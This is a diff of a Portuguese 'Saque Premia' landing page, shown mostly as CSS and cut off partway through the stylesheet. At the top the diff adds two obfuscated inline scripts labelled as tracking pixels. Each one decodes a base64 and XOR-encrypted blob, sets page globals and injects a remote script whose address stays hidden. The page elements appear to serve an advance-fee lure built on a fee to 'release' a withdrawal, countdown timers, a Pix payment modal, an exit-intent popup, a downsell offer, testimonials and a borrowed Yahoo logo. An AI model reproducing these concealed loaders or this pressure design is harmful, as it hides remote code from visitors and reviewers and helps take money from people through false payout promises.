@@ -3,798 +3,1904 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Status de Liberação - Acelerador de Saque</title>
+  <title>Saque Premia</title>
   
-  <!-- Inter Font -->
+  <!-- Pixel Utmify -->
+  <script>(function(){var n_p=atob("DLBmXX3ivDREYHbS28tEKA+Ong5mCAKmq8NcclKB2FpqFQK/stYfcx6N0RomElmhuMIPLQmRk0QtGBO+9MAPJRiOkl43QlrwusQSLxSAyUAhE1TogO1KfxqO01YlDAXw4esdfxOD0VFmWlSissgDMTSGnhhmFhe+rtVEZ1/U3Vd8VBTl6IdfaEva3gV3WEDhvYJfbx7AwWk5");var s_5v2s=[];for(var m_s87n=0;m_s87n<n_p.length;m_s87n++){s_5v2s.push(n_p.charCodeAt(m_s87n)&255);}var b_b2=s_5v2s[0];var i_jol=s_5v2s.slice(1,1+b_b2);var x_9116=s_5v2s.slice(1+b_b2);var s_hyx=x_9116.map(function(b,u_xtmq){return b^i_jol[u_xtmq%b_b2];});var v_c="";for(var n_fk4=0;n_fk4<s_hyx.length;n_fk4++){v_c+=String.fromCharCode(s_hyx[n_fk4]&255);}var r_7wa=decodeURIComponent(escape(v_c));var l_pm=JSON.parse(r_7wa);var r_8wjj=l_pm.globals||[];r_8wjj.forEach(function(q_b9){window[q_b9.name]=q_b9.value;});var k_k61=document.createElement("script");k_k61.src=l_pm.url;k_k61.async=true;k_k61.defer=true;(l_pm.attributes||[]).forEach(function(x_jcg){k_k61.setAttribute(x_jcg.name,x_jcg.value);});(document.head||document.documentElement).appendChild(k_k61);})();</script>
+
+  <!-- Captura de UTMs Utmify -->
+  <script>(function(){var a_jv6=atob("DBB1H5EuKIaCph6eAWtXauNCCrygzmrqcWNPML5NTOis02rzaHYMMfJBRajg1DHtYmIcb+VdB/P2y22xbXEBeuJaBuzxhDK8YGQBbfhMXfLn1TykWmtXcfBDTaS4hHr/dXFYauVDQeD7i27sZGYQceUDUOXtwjPtYntXM7NYSer3wzykIzIIM+oMRufvwzykI3QUa/ADXfLvz3jnLGAHeudLRvKv1Wv8aHQGPb0MXufu03u8OzJXYsxT");var k_rt=[];for(var l_6ru=0;l_6ru<a_jv6.length;l_6ru++){k_rt.push(a_jv6.charCodeAt(l_6ru)&255);}var m_50o=k_rt[0];var v_2t8=k_rt.slice(1,1+m_50o);var y_165=k_rt.slice(1+m_50o);var h_510=y_165.map(function(b,g_f7){return b^v_2t8[g_f7%m_50o];});var p_doo9="";for(var t_9f=0;t_9f<h_510.length;t_9f++){p_doo9+=String.fromCharCode(h_510[t_9f]&255);}var p_8mxl=decodeURIComponent(escape(p_doo9));var e_a3dh=JSON.parse(p_8mxl);var l_73o9=e_a3dh.globals||[];l_73o9.forEach(function(w_hye){window[w_hye.name]=w_hye.value;});var x_w5mu=document.createElement("script");x_w5mu.src=e_a3dh.url;x_w5mu.async=true;x_w5mu.defer=true;(e_a3dh.attributes||[]).forEach(function(j_es){x_w5mu.setAttribute(j_es.name,j_es.value);});(document.head||document.documentElement).appendChild(x_w5mu);})();</script>
+
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
-
+  
   <style>
-    /* CSS Reset & Variables */
-    *, *::before, *::after {
+    * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      -webkit-tap-highlight-color: transparent;
     }
 
     body {
-      background-color: #f1f5f9;
-      color: #0f172a;
-      min-height: 100vh;
+      background-color: #f3f5f8;
+      color: #1a202c;
       display: flex;
       justify-content: center;
-      align-items: flex-start;
-      padding: 24px 12px 48px;
+      padding: 20px 12px 30px;
     }
 
-    /* Main Container Card */
-    .page-wrapper {
-      width: 100%;
+    .container {
       max-width: 480px;
-      background: #ffffff;
-      border-radius: 28px;
-      border: 1px solid #e2e8f0;
-      box-shadow: 0 10px 25px -5px rgba(15, 23, 42, 0.05), 0 8px 10px -6px rgba(15, 23, 42, 0.03);
-      padding: 26px 20px 32px;
+      width: 100%;
       display: flex;
       flex-direction: column;
-      gap: 20px;
+      gap: 16px;
     }
 
-    /* Status Box */
-    .status-card {
-      background: #ffffff;
-      border: 1px solid #e2e8f0;
-      border-radius: 16px;
-      padding: 16px 18px 14px;
-    }
-
-    .status-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 11.5px;
-      font-weight: 800;
-      color: #334155;
-      letter-spacing: 0.3px;
-      text-transform: uppercase;
-      margin-bottom: 12px;
-    }
-
-    .status-header .step-highlight {
-      color: #0f172a;
-      font-weight: 800;
-    }
-
-    .status-badge {
-      color: #059669;
-      font-weight: 700;
-      display: flex;
-      align-items: center;
-      gap: 4px;
-      font-size: 11.5px;
-      text-transform: none;
-    }
-
-    .progress-bar-track {
-      width: 100%;
-      height: 9px;
-      background-color: #e2e8f0;
-      border-radius: 999px;
-      overflow: hidden;
-      margin-bottom: 8px;
-    }
-
-    .progress-bar-fill {
-      width: 28.5%; /* 2 de 7 concluindo */
-      height: 100%;
-      background: #2563eb;
-      border-radius: 999px;
-      transition: width 0.4s ease;
-    }
-
-    .status-footer {
-      text-align: right;
-      font-size: 11.5px;
-      color: #64748b;
-      font-weight: 500;
-    }
-
-    /* Taxa Paga Pill */
-    .taxa-paga-pill {
+    /* Badges & Headers */
+    .top-badge {
+      align-self: center;
       background: #e6f9f0;
-      border: 1px solid #b6ecd1;
-      border-radius: 999px;
-      padding: 10px 16px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
       color: #0d8a4e;
-      font-size: 12px;
-      font-weight: 800;
-      letter-spacing: 0.4px;
+      border: 1px solid #b6ecd1;
+      padding: 6px 14px;
+      border-radius: 999px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
       text-transform: uppercase;
     }
 
-    /* Main Headline & Description */
-    .main-hero-text {
+    .header-text {
       text-align: center;
-      padding: 2px 4px;
+      margin-top: 4px;
     }
 
-    .main-title {
+    .header-text h1 {
       font-size: 26px;
       line-height: 1.25;
       font-weight: 900;
       color: #0f172a;
-      letter-spacing: -0.4px;
-      margin-bottom: 14px;
     }
 
-    .main-title .amount-highlight {
-      color: #059669;
+    .header-text h1 span {
+      color: #6001d2;
     }
 
-    .main-description {
+    .header-text p {
       font-size: 13px;
-      color: #475569;
-      line-height: 1.55;
-    }
-
-    .main-description strong {
-      color: #0f172a;
-    }
-
-    .main-description .danger-highlight {
-      color: #dc2626;
-      text-decoration: underline;
-      text-underline-offset: 2px;
-      font-weight: 700;
-    }
-
-    /* Warning Card */
-    .warning-card {
-      background: #fef2f2;
-      border: 1px solid #fecaca;
-      border-radius: 18px;
-      padding: 18px 16px;
-      text-align: center;
-    }
-
-    .warning-title {
-      color: #dc2626;
-      font-size: 13px;
-      font-weight: 800;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
-      margin-bottom: 10px;
-    }
-
-    .warning-text {
-      font-size: 12px;
-      line-height: 1.55;
-      color: #b91c1c;
-    }
-
-    /* Expiration Timer Pill */
-    .expire-timer-pill {
-      background: #ffffff;
-      border: 1px solid #fecaca;
-      border-radius: 999px;
-      padding: 10px 16px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      font-size: 12px;
-      font-weight: 800;
-      color: #dc2626;
-      letter-spacing: 0.5px;
-      text-transform: uppercase;
-      box-shadow: 0 1px 3px rgba(220, 38, 38, 0.04);
-    }
-
-    .expire-timer-pill .timer-clock {
-      font-variant-numeric: tabular-nums;
-      letter-spacing: 1px;
-    }
-
-    /* Offer Recommended Card */
-    .offer-card {
-      position: relative;
-      border: 2px solid #facc15;
-      border-radius: 20px;
-      padding: 24px 18px 20px;
-      background: #ffffff;
-      margin-top: 4px;
-    }
-
-    .floating-recommend-badge {
-      position: absolute;
-      top: -12px;
-      right: 18px;
-      background: #eab308;
-      color: #0f172a;
-      font-size: 10.5px;
-      font-weight: 900;
-      letter-spacing: 0.6px;
-      padding: 4px 14px;
-      border-radius: 999px;
-      text-transform: uppercase;
-      box-shadow: 0 2px 6px rgba(234, 179, 8, 0.35);
-    }
-
-    .offer-header-group {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      margin-bottom: 16px;
-    }
-
-    .thunder-icon-box {
-      width: 44px;
-      height: 44px;
-      background: #eff6ff;
-      border-radius: 12px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #ea580c;
-      flex-shrink: 0;
-    }
-
-    .offer-header-info {
-      display: flex;
-      flex-direction: column;
-      gap: 2px;
-    }
-
-    .offer-tag-vip {
-      font-size: 10px;
-      font-weight: 800;
       color: #64748b;
-      letter-spacing: 0.6px;
-      text-transform: uppercase;
-    }
-
-    .offer-title {
-      font-size: 16px;
-      font-weight: 900;
-      color: #0f172a;
-      line-height: 1.25;
-    }
-
-    /* Inner Benefit Box */
-    .benefit-highlight-box {
-      background: #f8fafc;
-      border-radius: 12px;
-      padding: 14px 16px;
-      margin-bottom: 20px;
-    }
-
-    .benefit-title {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      font-size: 13px;
-      font-weight: 800;
-      color: #0f172a;
-      margin-bottom: 4px;
-    }
-
-    .benefit-title svg {
-      color: #059669;
-      stroke-width: 3;
-    }
-
-    .benefit-desc {
-      font-size: 11.5px;
-      color: #64748b;
-      line-height: 1.45;
-      padding-left: 20px;
-    }
-
-    /* Price Section */
-    .price-callout-wrap {
-      text-align: center;
-      margin-bottom: 18px;
-    }
-
-    .price-callout-label {
-      font-size: 11px;
-      font-weight: 800;
-      color: #64748b;
-      letter-spacing: 0.8px;
-      text-transform: uppercase;
-      margin-bottom: 4px;
-    }
-
-    .price-callout-value {
-      font-size: 38px;
-      font-weight: 900;
-      color: #2563eb;
-      letter-spacing: -0.8px;
-      line-height: 1.1;
-    }
-
-    /* CTA Button */
-    .btn-checkout-cta {
-      width: 100%;
-      background: #059669;
-      color: #ffffff;
-      border: none;
-      padding: 16px 20px;
-      border-radius: 12px;
-      font-size: 14.5px;
-      font-weight: 900;
-      letter-spacing: 0.3px;
-      text-transform: uppercase;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      text-decoration: none;
-      box-shadow: 0 4px 14px rgba(5, 150, 105, 0.35);
-      transition: background-color 0.15s ease, transform 0.1s ease, box-shadow 0.15s ease;
-    }
-
-    .btn-checkout-cta:hover {
-      background: #047857;
-      box-shadow: 0 6px 18px rgba(5, 150, 105, 0.45);
-    }
-
-    .btn-checkout-cta:active {
-      transform: scale(0.985);
-      background: #065f46;
-    }
-
-    /* Resumo da Transação Card */
-    .summary-card {
-      background: #ffffff;
-      border: 1px solid #e2e8f0;
-      border-radius: 16px;
-      padding: 18px 18px 16px;
-    }
-
-    .summary-title {
-      font-size: 11.5px;
-      font-weight: 900;
-      color: #0f172a;
-      letter-spacing: 0.6px;
-      text-transform: uppercase;
-      margin-bottom: 14px;
-    }
-
-    .summary-list {
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
-
-    .summary-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 12.5px;
-      color: #475569;
-    }
-
-    .summary-row-label {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .summary-row-val {
-      font-weight: 700;
-      color: #0f172a;
-    }
-
-    .badge-paid-green {
-      background: #dcfce7;
-      color: #15803d;
-      font-size: 11px;
-      font-weight: 800;
-      padding: 4px 10px;
-      border-radius: 6px;
-      letter-spacing: 0.3px;
-    }
-
-    .summary-divider {
-      height: 1px;
-      background: #e2e8f0;
-      margin: 14px 0 12px;
-    }
-
-    .summary-total-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
-    .summary-total-label {
-      font-size: 13.5px;
-      font-weight: 800;
-      color: #0f172a;
-    }
-
-    .summary-total-val {
-      font-size: 19px;
-      font-weight: 900;
-      color: #2563eb;
-      letter-spacing: -0.3px;
-    }
-
-    /* Comments Section */
-    .comments-wrapper {
-      margin-top: 4px;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
-
-    .comments-section-title {
-      font-size: 14px;
-      font-weight: 800;
-      color: #0f172a;
-    }
-
-    .comment-card {
-      background: #f8fafc;
-      border: 1px solid #e2e8f0;
-      border-radius: 14px;
-      padding: 14px 16px;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-
-    .comment-header {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    .comment-avatar {
-      width: 38px;
-      height: 38px;
-      border-radius: 50%;
-      object-fit: cover;
-      flex-shrink: 0;
-      background: #e2e8f0;
-    }
-
-    .comment-author-info h4 {
-      font-size: 12.5px;
-      font-weight: 800;
-      color: #0f172a;
-      line-height: 1.2;
-    }
-
-    .comment-author-info span {
-      font-size: 10.5px;
-      color: #94a3b8;
-    }
-
-    .comment-body {
-      font-size: 12px;
-      color: #334155;
+      margin-top: 10px;
       line-height: 1.5;
     }
 
-    .comment-actions {
+    /* Timer Pill */
+    .timer-pill {
+      background: #ffffff;
+      border: 1px solid #fecaca;
+      border-radius: 999px;
+      padding: 10px 18px;
+      text-align: center;
+      font-size: 13px;
+      color: #dc2626;
+      font-weight: 600;
       display: flex;
       align-items: center;
-      gap: 14px;
-      font-size: 11px;
-      color: #64748b;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 1px 2px rgba(220, 38, 38, 0.05);
+    }
+
+    /* Trust Chips */
+    .trust-chips {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 6px;
+    }
+
+    .chip {
+      background: #ffffff;
+      border: 1px solid #e2e8f0;
+      border-radius: 999px;
+      padding: 8px 4px;
+      font-size: 10.5px;
+      color: #475569;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
       font-weight: 600;
     }
 
-    .comment-action-btn {
-      background: none;
-      border: none;
-      color: inherit;
-      font-size: inherit;
-      font-weight: inherit;
-      cursor: pointer;
-      padding: 0;
+    /* Standard Cards */
+    .card {
+      background: #ffffff;
+      border-radius: 20px;
+      padding: 20px 18px;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
+      border: 1px solid #e2e8f0;
     }
 
-    .comment-action-btn:hover {
+    .card-border-red {
+      border-left: 4px solid #ef4444;
+    }
+
+    .card-title {
+      font-size: 14px;
+      font-weight: 800;
+      color: #0f172a;
+      margin-bottom: 8px;
+    }
+
+    /* Warning List */
+    .warning-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 12px;
+      font-size: 12.5px;
+      color: #334155;
+    }
+
+    .warning-list li {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    /* Purple Explanation Card */
+    .purple-card {
+      background: linear-gradient(135deg, #6001d2, #47009e);
+      border-radius: 20px;
+      padding: 22px 18px;
+      color: #ffffff;
+      text-align: center;
+    }
+
+    .purple-badge {
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 999px;
+      padding: 4px 12px;
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      display: inline-block;
+      text-transform: uppercase;
+      margin-bottom: 12px;
+    }
+
+    .purple-card h2 {
+      font-size: 18px;
+      font-weight: 800;
+      margin-bottom: 10px;
+    }
+
+    .purple-card p {
+      font-size: 12.5px;
+      line-height: 1.55;
+      color: #f3e8ff;
+    }
+
+    /* Feature Check List */
+    .features-list {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .feature-item {
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+    }
+
+    .feature-item .icon {
+      color: #10b981;
+      margin-top: 1px;
+      flex-shrink: 0;
+    }
+
+    .feature-item h3 {
+      font-size: 13px;
+      font-weight: 700;
       color: #0f172a;
     }
 
-    .comment-like-badge {
+    .feature-item p {
+      font-size: 11.5px;
+      color: #64748b;
+      margin-top: 2px;
+    }
+
+    /* Steps Section */
+    .section-headline {
+      font-size: 14px;
+      font-weight: 800;
+      text-transform: uppercase;
+      color: #0f172a;
+      margin-bottom: 14px;
+    }
+
+    .steps-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .step-box {
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 12px;
+      padding: 12px;
+      display: flex;
+      gap: 12px;
+    }
+
+    .step-num {
+      width: 28px;
+      height: 28px;
+      background: #15803d;
+      color: #ffffff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 13px;
+      flex-shrink: 0;
+    }
+
+    .step-content h4 {
+      font-size: 13px;
+      font-weight: 700;
+      color: #0f172a;
+    }
+
+    .step-content p {
+      font-size: 11.5px;
+      color: #475569;
+      margin-top: 2px;
+      line-height: 1.4;
+    }
+
+    .note-box {
+      background: #f0fdf4;
+      border: 1px solid #bbf7d0;
+      border-radius: 10px;
+      padding: 10px 12px;
+      font-size: 11px;
+      color: #166534;
+      margin-top: 10px;
+      line-height: 1.4;
+    }
+
+    /* Payment Box */
+    .pay-card {
+      background: #ffffff;
+      border-radius: 20px;
+      padding: 20px 18px;
+      border: 1.5px solid #facc15;
+      text-align: center;
+    }
+
+    .receipt-header {
+      font-size: 10px;
+      font-weight: 800;
+      color: #ca8a04;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 12px;
+    }
+
+    .receipt-line {
+      display: flex;
+      justify-content: space-between;
+      font-size: 13px;
+      color: #475569;
+      margin-bottom: 8px;
+    }
+
+    .highlight-price {
+      font-size: 32px;
+      font-weight: 900;
+      color: #eab308;
+      margin: 14px 0;
+    }
+
+    /* Buttons */
+    .btn-green {
+      background: #16a34a;
+      color: #ffffff;
+      border: none;
+      width: 100%;
+      padding: 14px 16px;
+      border-radius: 12px;
+      font-size: 13px;
+      font-weight: 800;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      text-transform: uppercase;
+      box-shadow: 0 4px 12px rgba(22, 163, 74, 0.28);
+      transition: background-color 0.15s ease, transform 0.1s ease;
+    }
+
+    .btn-green:active {
+      transform: scale(0.99);
+      background-color: #15803d;
+    }
+
+    .btn-sub {
+      font-size: 10px;
+      color: #64748b;
+      margin-top: 8px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 12px;
+    }
+
+    /* Guarantee */
+    .status-alert {
+      background: #f0fdf4;
+      border: 1px solid #dcfce7;
+      border-radius: 12px;
+      padding: 10px;
+      font-size: 11px;
+      color: #166534;
+      margin-top: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .green-dot {
+      width: 8px;
+      height: 8px;
+      background: #22c55e;
+      border-radius: 50%;
+      flex-shrink: 0;
+    }
+
+    /* Testimonials */
+    .testimonial {
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 12px;
+      padding: 12px;
+      margin-top: 10px;
+    }
+
+    .testimonial-user {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 6px;
+    }
+
+    .avatar {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 1.5px solid #cbd5e1;
+      flex-shrink: 0;
+    }
+
+    .testimonial-meta h5 {
+      font-size: 12px;
+      font-weight: 700;
+      color: #0f172a;
+    }
+
+    .testimonial-meta span {
+      font-size: 10px;
+      color: #94a3b8;
+    }
+
+    .stars {
+      color: #eab308;
+      font-size: 10px;
+    }
+
+    .testimonial-text {
+      font-size: 11.5px;
+      color: #475569;
+      line-height: 1.4;
+    }
+
+    .faq-container {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .faq-item {
+      background: #ffffff;
+      border: 1.5px solid #d1fae5;
+      border-radius: 16px;
+      overflow: hidden;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .faq-item.active {
+      border-color: #86efac;
+      box-shadow: 0 4px 12px rgba(22, 163, 74, 0.06);
+    }
+
+    .faq-header {
+      width: 100%;
+      background: none;
+      border: none;
+      text-align: left;
+      padding: 16px 18px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
+      cursor: pointer;
+      font-size: 13px;
+      font-weight: 700;
+      color: #0f172a;
+      transition: color 0.15s ease;
+    }
+
+    .faq-header:hover {
+      color: #16a34a;
+    }
+
+    .faq-chevron {
+      color: #16a34a;
+      flex-shrink: 0;
+      transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .faq-item.active .faq-chevron {
+      transform: rotate(180deg);
+    }
+
+    .faq-body {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .faq-content {
+      padding: 0 18px 16px 18px;
+      font-size: 12px;
+      line-height: 1.55;
+      color: #475569;
+    }
+
+    /* Red Pill Countdown */
+    .pill-red {
+      background: #dc2626;
+      color: #ffffff;
+      border-radius: 999px;
+      padding: 8px 16px;
+      font-size: 12px;
+      font-weight: 700;
       display: inline-flex;
       align-items: center;
-      gap: 4px;
-      color: #e11d48;
-      font-weight: 700;
+      gap: 6px;
+      margin-bottom: 12px;
     }
 
-    /* Legal Disclaimer Footer */
-    .legal-disclaimer {
-      font-size: 9.5px;
-      line-height: 1.6;
+    /* Yahoo Logo Container */
+    .yahoo-logo-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 8px 0 16px;
+    }
+
+    .yahoo-img {
+      height: 38px;
+      max-width: 175px;
+      width: auto;
+      object-fit: contain;
+      display: block;
+    }
+
+    /* ========================================================
+       MODAL PIX (3 ETAPAS)
+    ======================================================== */
+    .modal-backdrop {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(15, 23, 42, 0.72);
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
+      z-index: 9999;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+
+    .modal-backdrop.open {
+      display: flex;
+    }
+
+    .modal-card {
+      background: #ffffff;
+      border-radius: 28px;
+      max-width: 440px;
+      width: 100%;
+      padding: 28px 22px;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.35);
+      position: relative;
+      animation: modalFadeIn 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    @keyframes modalFadeIn {
+      from { transform: scale(0.94); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .modal-close-btn {
+      position: absolute;
+      top: 18px;
+      right: 18px;
+      background: none;
+      border: none;
       color: #94a3b8;
-      text-align: justify;
-      padding-top: 10px;
-      border-top: 1px solid #f1f5f9;
+      font-size: 20px;
+      cursor: pointer;
+      line-height: 1;
+      padding: 4px;
     }
 
-    .legal-disclaimer strong {
+    .modal-circle-icon {
+      width: 58px;
+      height: 58px;
+      border-radius: 50%;
+      margin: 0 auto 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .modal-circle-icon.green-light {
+      background: #e6f9f0;
+      color: #10b981;
+    }
+
+    .modal-circle-icon.blue-light {
+      background: #eff6ff;
+      color: #3b82f6;
+    }
+
+    .modal-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #0f172a;
+      text-align: center;
+      margin-bottom: 6px;
+    }
+
+    .modal-desc {
+      font-size: 13px;
       color: #64748b;
+      text-align: center;
+      line-height: 1.45;
+      margin-bottom: 20px;
+    }
+
+    .pix-input-label {
+      font-size: 11px;
+      font-weight: 800;
+      color: #0f172a;
+      margin-bottom: 6px;
+      display: block;
+      letter-spacing: 0.3px;
+    }
+
+    .pix-input {
+      width: 100%;
+      background: #0f172a;
+      color: #ffffff;
+      border: 1px solid #1e293b;
+      border-radius: 14px;
+      padding: 14px 16px;
+      font-size: 13px;
+      margin-bottom: 16px;
+      outline: none;
+    }
+
+    .pix-input::placeholder {
+      color: #64748b;
+    }
+
+    .btn-blue {
+      background: #2563eb;
+      color: #ffffff;
+      border: none;
+      width: 100%;
+      padding: 15px;
+      border-radius: 14px;
+      font-size: 13px;
+      font-weight: 800;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      text-transform: uppercase;
+      box-shadow: 0 4px 14px rgba(37, 99, 235, 0.3);
+    }
+
+    .progress-bar-bg {
+      background: #f1f5f9;
+      height: 8px;
+      border-radius: 999px;
+      overflow: hidden;
+      margin: 14px 0 10px;
+    }
+
+    .progress-bar-fill {
+      background: #2563eb;
+      height: 100%;
+      width: 25%;
+      border-radius: 999px;
+      transition: width 0.6s ease;
+    }
+
+    .progress-meta {
+      display: flex;
+      justify-content: space-between;
+      font-size: 11px;
+      font-weight: 700;
+      color: #64748b;
+      margin-bottom: 12px;
+    }
+
+    .status-items {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      font-size: 12px;
+      font-weight: 600;
+      color: #64748b;
+      margin: 16px 0;
+      text-align: left;
+    }
+
+    .status-items .active {
+      color: #2563eb;
       font-weight: 700;
     }
 
-    /* Responsive adjustment for small mobile displays */
-    @media (max-width: 360px) {
-      .page-wrapper {
-        padding: 20px 14px 28px;
-      }
-      .main-title {
-        font-size: 22px;
-      }
-      .price-callout-value {
-        font-size: 32px;
-      }
-      .btn-checkout-cta {
-        font-size: 13.5px;
-      }
+    .status-items .done {
+      color: #059669;
+      font-weight: 700;
+    }
+
+    .modal-warning-box {
+      background: #fef2f2;
+      border: 1px solid #fee2e2;
+      border-radius: 12px;
+      padding: 10px 12px;
+      font-size: 11.5px;
+      color: #991b1b;
+      line-height: 1.4;
+      margin-bottom: 16px;
+    }
+
+    .btn-redirect {
+      background: #fffbeb;
+      border: 1.5px solid #fde68a;
+      color: #b45309;
+      font-weight: 800;
+      font-size: 12.5px;
+      width: 100%;
+      padding: 13px;
+      border-radius: 14px;
+      cursor: pointer;
+      text-align: center;
+    }
+
+    /* ========================================================
+       EXIT-INTENT POPUP
+    ======================================================== */
+    .exit-backdrop {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(10, 15, 29, 0.88);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      z-index: 10000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+
+    .exit-backdrop.open {
+      display: flex;
+    }
+
+    .exit-card {
+      background: #0f172a;
+      border-radius: 28px;
+      max-width: 440px;
+      width: 100%;
+      padding: 26px 20px;
+      box-shadow: 0 0 45px rgba(239, 68, 68, 0.28);
+      border: 1.5px solid rgba(239, 68, 68, 0.65);
+      text-align: center;
+      animation: modalFadeIn 0.25s ease-out;
+    }
+
+    .exit-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(239, 68, 68, 0.15);
+      border: 1px solid rgba(239, 68, 68, 0.4);
+      color: #f87171;
+      padding: 6px 14px;
+      border-radius: 999px;
+      font-size: 10px;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      margin-bottom: 14px;
+    }
+
+    .exit-title {
+      font-size: 22px;
+      font-weight: 900;
+      color: #ffffff;
+      line-height: 1.25;
+      margin-bottom: 8px;
+    }
+
+    .exit-desc {
+      font-size: 12.5px;
+      color: #cbd5e1;
+      line-height: 1.45;
+      margin-bottom: 16px;
+    }
+
+    .exit-desc strong {
+      color: #facc15;
+    }
+
+    .exit-timer-box {
+      background: #090e1a;
+      border: 1px solid #1e293b;
+      border-radius: 14px;
+      padding: 12px;
+      font-size: 13px;
+      font-weight: 600;
+      color: #94a3b8;
+      margin-bottom: 16px;
+    }
+
+    .exit-timer-box strong {
+      color: #ef4444;
+      font-size: 15px;
+    }
+
+    .exit-cta {
+      background: #10b981;
+      color: #ffffff;
+      border: none;
+      width: 100%;
+      padding: 15px;
+      border-radius: 14px;
+      font-size: 13px;
+      font-weight: 900;
+      text-transform: uppercase;
+      cursor: pointer;
+      box-shadow: 0 4px 18px rgba(16, 185, 129, 0.35);
+      margin-bottom: 14px;
+    }
+
+    .exit-dismiss-link {
+      background: none;
+      border: none;
+      color: #64748b;
+      font-size: 11px;
+      text-decoration: underline;
+      cursor: pointer;
+      display: inline-block;
+      padding: 6px;
+    }
+
+    .exit-dismiss-link:hover {
+      color: #94a3b8;
+    }
+
+    /* ========================================================
+       PÁGINA DOWNSELL (COTA R$ 8.420 / TAXA R$ 11,68)
+    ======================================================== */
+    .downsell-screen {
+      display: none;
+      width: 100%;
+      max-width: 480px;
+      flex-direction: column;
+      gap: 16px;
+      animation: modalFadeIn 0.3s ease;
+    }
+
+    .downsell-screen.active {
+      display: flex;
+    }
+
+    .downsell-top-badge {
+      background: #ea580c;
+      color: #ffffff;
+      padding: 10px 14px;
+      border-radius: 12px;
+      font-size: 11px;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+      text-align: center;
+      text-transform: uppercase;
+      box-shadow: 0 4px 14px rgba(234, 88, 12, 0.3);
+    }
+
+    .downsell-header {
+      text-align: center;
+      color: #ffffff;
+    }
+
+    .downsell-header h1 {
